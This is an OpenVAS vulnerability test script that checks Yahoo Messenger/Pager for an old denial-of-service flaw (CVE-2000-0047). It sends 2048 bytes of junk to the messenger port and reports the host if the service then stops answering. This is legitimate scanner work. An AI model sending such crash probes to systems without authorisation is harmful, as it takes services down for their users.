# OpenVAS Vulnerability Test
# $Id: yahoo_dos.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Yahoo Messenger Denial of Service attack
#
# Authors:
# Noam Rathaus <noamr@securiteam.com>
# Updated to Check Yahoo Messenger/Pager
#   -By Sharath S <sharaths@secpod.com> on 2009-04-24
#
# Copyright:
# Copyright (C) 1999 SecuriTeam
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_impact = "Successful attacks can cause Yahoo Messenger to crash by sending a few
  bytes of garbage into its listening port TCP 5101.
  Impact Level: Application";
tag_affected = "Yahoo Messenger/Pager";
tag_insight = "The flaw is cause due to buffer overflow error while sending a long URL
  within a message.";
tag_solution = "No solution or patch is available as of 24th April, 2009. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://messenger.yahoo.com";
tag_summary = "This host has Yahoo Messenger or Pager installed and is prone to
  Denial of Service Vulnerability.";

if(description)
{
  script_id(10326);
  script_version("$Revision: 17 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"cvss_temporal", value:"4.2");
  script_tag(name:"risk_factor", value:"Medium");
  script_cve_id("CVE-2000-0047");
  script_name("Yahoo Messenger Denial of Service attack");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/6865");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/3869");

  script_description(desc);
  script_summary("Check for the Denial Attack on Yahoo Messenger/Pager");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 1999 SecuriTeam");
  family = "Denial of Service";
  script_family(family);
  script_dependencies("yahoo_msg_running.nasl");
  script_require_ports("Services/yahoo_messenger");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


ymsgPort = get_kb_item("Services/yahoo_messenger");
if(!ymsgPort){
  ymsgPort = 5010;
}

if(get_port_state(ymsgPort))
{
  sock5101 = open_sock_tcp(ymsgPort);
  if(sock5101)
  {
    send(socket:sock5101, data:crap(2048));
    close(sock5101);

    sock5101_sec = open_sock_tcp(ymsgPort);
    if(!sock5101_sec){
      security_warning(port:ymsgPort, proto:"tcp");
    }
    else close(sock5101_sec);
  }
}
